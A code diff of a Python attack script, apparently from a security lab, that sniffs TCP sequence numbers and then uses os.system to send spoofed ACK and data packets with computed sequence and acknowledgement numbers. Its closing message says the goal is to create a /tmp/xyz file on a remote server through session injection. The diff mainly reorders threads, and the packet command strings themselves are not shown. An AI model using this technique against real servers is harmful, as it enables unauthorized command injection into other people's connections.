@@ -21,9 +21,6 @@ def syn_ack_1(pkt):
         y=pkt[TCP].seq
         y = y + 1
         print("Y: " + str(y))
-        run_plain_ack()
-        run_data_ack()
-        run_syn_ack()
  
 def syn_2(pkt):
         z=pkt[TCP].seq
@@ -39,6 +36,8 @@ def run_plain_ack():
     cmd = cmd_2 + '--tcp-acknum ' + str(y) + ' --tcp-seqnum ' + str(x)
     print(cmd)
     os.system(cmd)
+    run_data_ack()
+    run_syn_ack()
  
 def run_data_ack():
     time.sleep(2)
@@ -67,19 +66,27 @@ def sniff_3():
 def main():
         print("Sniffing Traffic...\n\n")
  
+        # TODO: Thread and join at the correct places so each thread has access to the necessary x, y, and z variables 
         command1Thread = threading.Thread(target=run_syn)
+        command2Thread = threading.Thread(target=run_plain_ack)
         sniff1Thread = threading.Thread(target=sniff_1)
         sniff2Thread = threading.Thread(target=sniff_2)
         sniff3Thread = threading.Thread(target=sniff_3)
+        
+        # Run the first command and get x and y
         command1Thread.start()
         sniff1Thread.start()
         sniff2Thread.start()
-        sniff3Thread.start()
-	command1Thread.join()
+        command1Thread.join()
         sniff1Thread.join()
         sniff2Thread.join()
+        
+        # Run the next commands
+        command2Thread.start()
+        sniff3Thread.start()
+        command2Thread.join()
         sniff3Thread.join()
-        print("DONE")
+        print("\n\nDONE. Check the server for the /tmp/xyz file.")
  
 if __name__ == "__main__":
         main()
